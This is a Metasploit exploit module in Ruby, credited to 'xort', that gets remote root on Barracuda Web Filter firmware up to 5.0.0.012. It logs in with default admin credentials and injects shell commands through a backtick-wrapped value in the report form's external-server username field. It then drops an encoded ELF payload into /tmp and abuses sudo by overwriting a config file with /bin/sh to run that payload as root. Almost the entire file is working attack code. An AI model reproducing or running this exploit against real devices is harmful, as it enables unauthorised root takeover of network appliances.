# Exploit Author: xort
# Vendor Homepage: https://www.barracuda.com/
# Software Link: https://www.barracuda.com/products/webfilter
# Version: Firmware <= 5.0.0.012
# Tested on: Vx and Hardware platforms
#
# Postauth remote root in Barracuda Firmware <= 5.0.0.012 for any under priviledged user with report generating
# capablities. This exploit leverages a command injection bug along with poor sudo permissions to obtain
# root. xort@blacksecurity.org
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
    include  Exploit::Remote::Tcp
        include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Barracuda Firmware <= 5.0.0.012 reporting Post Auth Remote Root&#039;,
                    &#039;Description&#039;    => %q{
                    This module exploits a remote command execution vulnerability in
                the Barracuda Firmware Version <= 5.0.0.012 by exploiting a
                vulnerability in the web administration interface.
                    By sending a specially crafted request it&#039;s possible to inject system
                 commands while escalating to root do to relaxed sudo configuration on the local
                machine.
            },
            &#039;Author&#039;         =>
                [
                    &#039;xort&#039;, # metasploit module
                ],
            &#039;Version&#039;        => &#039;$Revision: 12345 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;none&#039;, &#039;none&#039;],
                ],
            &#039;Platform&#039;      => [ &#039;linux&#039;],
            &#039;Privileged&#039;     => true,
             &#039;Arch&#039;          => [ ARCH_X86 ],
                        &#039;SessionTypes&#039;  => [ &#039;shell&#039; ],
                        &#039;Privileged&#039;     => false,
 
                &#039;Payload&#039;        =>
                                  &#039;Compat&#039; =>
                                  {
                                        &#039;ConnectionType&#039; => &#039;find&#039;,
                                  }
                                },
 
            &#039;Targets&#039;        =>
                [
                    [&#039;Linux Universal&#039;,
                        {
                                &#039;Arch&#039; => ARCH_X86,
                                &#039;Platform&#039; => &#039;linux&#039;
                        }
                    ],
                ],
            &#039;DefaultTarget&#039; => 0))
 
            register_options(
                [
                    OptString.new(&#039;PASSWORD&#039;, [ false, &#039;Device password&#039;, "" ]),   
                    OptString.new(&#039;ET&#039;, [ false, &#039;Device password&#039;, "" ]),
                        OptString.new(&#039;USERNAME&#039;, [ true, &#039;Device password&#039;, "admin" ]),   
                    OptString.new(&#039;CMD&#039;, [ false, &#039;Command to execute&#039;, "" ]), 
                    Opt::RPORT(8000),
                ], self.class)
    end
 
    def do_login(username, password, et)
        vprint_status( "Logging into machine with credentials...\n" )
         
          # timeout
        timeout = 1550;
 
        # params
                password_clear = "admin"
        real_user = "";
        login_state = "out"
        enc_key = Rex::Text.rand_text_hex(32)
        et = "1358817515"
        locale = "en_US"
        user = username
        password = Digest::MD5.hexdigest(username+enc_key)
        enctype = "MD5"
        password_entry = ""
         
         
        vprint_status( "Starting first routine...\n" )
 
                data = "real_user=#{real_user}&login_state=#{login_state}&enc_key=#{enc_key}&et=#{et}&locale=#{locale}&user=#{user}&password=#{password}&enctype=#{enctype}&password_entry=#{password_entry}&password_clear=#{password_clear}&Submit=Login"
     
        vprint_status( "#{data}\n" )
         
            res = send_request_cgi(
                {
                      &#039;method&#039;  => &#039;POST&#039;,
                      &#039;uri&#039;     => "/cgi-mod/index.cgi",
                      &#039;cookie&#039;  => "",
              &#039;data&#039;    => data
               }, timeout)
 
 
        vprint_status( "login got code: #{res.code} ... continuing to second request..." )
        File.open("/tmp/output2", &#039;w+&#039;) {|f| f.write(res.body) }
 
        # get rid of first yank
        password = res.body.split(&#039;\n&#039;).grep(/(.*)id=\"password\" value=\"(.*)\"/){$2}[0] #change to match below for more exact result
        et = res.body.split(&#039;\n&#039;).grep(/(.*)id=\"et\" value=\"([^\"]+)\"/){$2}[0]
 
        vprint_status( "password got back = #{password} - et got back = #{et}\n" )
 
        return password, et
    end
 
    def run_command(username, password, et, cmd)
        vprint_status( "Running Command...\n" )
 
        exploitreq = [
        [ "primary_tab", "BASIC" ],
        [ "secondary_tab","reports" ],
        [ "realm","" ],
        [ "auth_type","Local" ],
        [ "user", username ],
        [ "password", password  ],
        [ "et",et ],
        [ "role","" ],
        [ "locale","en_US" ],
        [ "q","" ],
        [ "UPDATE_new_report_time_frame","custom" ],
        [ "report_start","2013-01-25 01:14" ],
        [ "report_end","2013-01-25 02:14" ],
        [ "type","" ],
        [ "ntlm_server","" ],
        [ "kerb_server","" ],
        [ "local_group","changeme" ],          
        [ "ip_group","20.20.108.0/0.0.0.0" ], 
        [ "ip_address__0","" ],
        [ "ip_address__1","" ],
        [ "ip_address__2","" ],
        [ "ip_address__3","" ],
        [ "netmask__0","" ],
        [ "netmask__1","" ],
        [ "netmask__2","" ],
        [ "netmask__3","" ],
        [ "UPDATE_new_report_pattern_values","" ],
        [ "UPDATE_new_report_pattern_text","" ],
        [ "UPDATE_new_report_filter_destination","domain" ],
        [ "filter_domain","" ],
        [ "UPDATE_new_report_filter_domain","" ],
        [ "UPDATE_new_report_filter_category","" ],
        [ "UPDATE_new_report_exclude_from","" ],
        [ "UPDATE_new_report_exclude_to","" ],
        [ "UPDATE_new_report_exclude_days","" ],
        [ "allow","allow" ],
        [ "block","block" ],
        [ "warn","warn" ],
        [ "monitor","monitor" ],
        [ "UPDATE_new_report_filter_actions","allow,block,warn,monitor" ],
        [ "UPDATE_new_report_filter_count","10" ],
        [ "UPDATE_new_report_chart_type","vbar" ],
        [ "UPDATE_new_report_format","html" ],
        [ "DEFAULT_new_report_group_expand","No" ],
        [ "UPDATE_new_report_expand_user_count","5" ],
        [ "UPDATE_new_report_expand_domain_count","5" ],
        [ "UPDATE_new_report_expand_cat_count","5" ],
        [ "UPDATE_new_report_expand_url_count","5" ],
        [ "UPDATE_new_report_expand_threat_count","5" ],
        [ "report","on" ],
        [ "UPDATE_new_report_name", Rex::Text.rand_text_alphanumeric(10) ],
        [ "UPDATE_new_report_id","" ],
        [ "UPDATE_new_report_enabled","Yes" ],
        [ "secondary_scope","report" ],
        [ "secondary_scope_data","" ],
        [ "UPDATE_new_report_reports","sessions_by_user,infection_activity" ],
        [ "UPDATE_new_report_delivery","external" ],
        [ "UPDATE_new_report_delivery_dest_email","" ],
        [ "UPDATE_new_report_server","new" ],
        [ "UPDATE_new_external_server_type","smb" ],
        [ "UPDATE_new_external_server_alias", Rex::Text.rand_text_alphanumeric(10) ],
        [ "UPDATE_new_external_server","4.4.4.4" ],
        [ "UPDATE_new_external_server_port","445" ],
        [ "UPDATE_new_external_server_username","\"` #{cmd} `\"" ],
        [ "UPDATE_new_external_server_password","asdf" ],
        [ "UPDATE_new_external_server_path","/"+ Rex::Text.rand_text_alphanumeric(15) ],
        [ "UPDATE_new_report_frequency", "once" ],
        [ "UPDATE_new_report_split", "no" ],
        [ "add_report_id","Apply" ],
        [ "remover","" ]
        ]
 
         
            data = Rex::MIME::Message.new
        data.bound = "---------------------------" + Rex::Text.rand_text_numeric(30)
     
        exploitreq.each do |xreq|
                data.add_part(xreq[1], nil, nil, "form-data; name=\"" + xreq[0] + "\"")
        end
 
            post_data = data.to_s
            post_data = post_data.gsub(/\r\n---------------------------/, "---------------------------")       
 
        datastore[&#039;UserAgent&#039;] = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0"
 
        vprint_status( "sending..." )
            res = send_request_cgi({
               &#039;method&#039; => &#039;POST&#039;,
               &#039;uri&#039;    => "/cgi-mod/index.cgi",
               &#039;ctype&#039;  => "multipart/form-data; boundary=#{data.bound}",
                   &#039;data&#039;   => post_data,
           &#039;headers&#039; =>
            {
                &#039;Accept&#039; => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                &#039;Accept-Language&#039; => "en-US,en;q=0.5"
            }
            }) 
 
        if res.code == 200
            vprint_status( "You can now reuse the login params you were supplied to avoid the lengthy wait at the exploits initial launch.... \n" )
            vprint_status( "password: #{password} et: #{et}\n" )
        end
 
 
        vprint_status( "login got code: #{res.code} from report_results.cgi\n" )
        File.open("/tmp/output4", &#039;w+&#039;) {|f| f.write(res.body) }
    end
 
    def run_script(username, password, et, cmds)
        vprint_status( "running script...\n")
       
       
    end
     
    def exploit
        # timeout
        timeout = 1550;
 
        user = "admin"
         
        # params
                real_user = "";
        login_state = "out"
                et = "1358817515" #epoch time
        locale = "en_US"
        user = "admin"
        password = ""
        enctype = "MD5"
        password_entry = ""
        password_clear = "admin"
         
                vprint_status("<- Encoding payload to elf string...")
                elf = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
                encoded_elf = elf.unpack("H*").join().gsub(/(\w)(\w)/,&#039;\\\\\\\\\\x\1\2&#039;) # extra escaping to get passed down correctly
 
        if not datastore[&#039;PASSWORD&#039;].nil? and not datastore[&#039;PASSWORD&#039;].empty?
 
            password_clear = "admin"
            password = datastore[&#039;PASSWORD&#039;]
            et = datastore[&#039;ET&#039;]
 
                # else - if no &#039;CMD&#039; string - add code for root shell
                else  
 
            password, et = do_login(user, password, et)
            vprint_status("new password: #{password}\n")
        end
 
        sleep(5)
 
        if not datastore[&#039;CMD&#039;].nil? and not datastore[&#039;CMD&#039;].empty?
            cmd = datastore[&#039;CMD&#039;] 
        end
 
        run_command(user, password, et, cmd)
         
        # create elf in /tmp, abuse sudo to overwrite another command we have sudo access to (tar), then execute with sudo perm
        cmd =  "echo -ne #{encoded_elf} > /tmp/x ;"
        cmd += "chmod +x /tmp/x ;"
 
        # backup static_routes file
        cmd += "cp -f /home/product/code/config/static_routes /tmp/zzz"
        cmd += "sudo cp -f /bin/sh /home/product/code/config/static_routes"
     
        # execute elf as root
        cmd += "sudo /home/product/code/config/static_routes -c /tmp/x ;"
 
        # restore static_routes file
        cmd += "cp -f /tmp/zzz /home/product/code/config/static_routes"
         
         
        run_command(user, password, et, cmd)
        sleep(2)
        handler
        sleep(5)
         
    end
 
end

